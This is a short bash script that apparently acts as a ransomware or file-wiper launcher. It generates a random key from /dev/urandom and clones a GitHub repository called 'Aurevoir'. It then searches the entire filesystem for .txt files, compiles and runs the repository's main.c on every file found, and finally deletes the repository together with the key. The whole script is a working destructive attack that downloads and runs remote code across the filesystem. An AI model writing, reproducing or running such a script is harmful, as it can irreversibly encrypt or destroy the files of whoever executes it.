#!/bin/bash


apt-get install git
apt-get install gcc

initialLocation="$(pwd)"
numberOfFiles=0
locationOfFile=""
currentType=""

cd /dev
head -16 urandom > keyGenDump.txt

git clone https://github.com/ape-x/Aurevoir.git
mv keyGenDump.txt Aurevoir
mv Aurevoir $initialLocation
cd $initialLocation
cd Aurevoir

touch fileLocations.txt
find / -name "*.txt" >> fileLocations.txt

for i in $(seq 1 27)
    do
    currentType="$(head -n $i items.txt | tail -1)"
    find / -name "$currentType"
    done
    
gcc -o exe main.c

numberOfFiles=$(wc -l < fileLocations.txt)

for i in $(seq 1 $numberOfFiles)
    do
    locationOfFile="$(head -n $i fileLocations.txt | tail -1)"
    ./exe $locationOfFile
    done

cd ..
rm -rf Aurevoir

exit
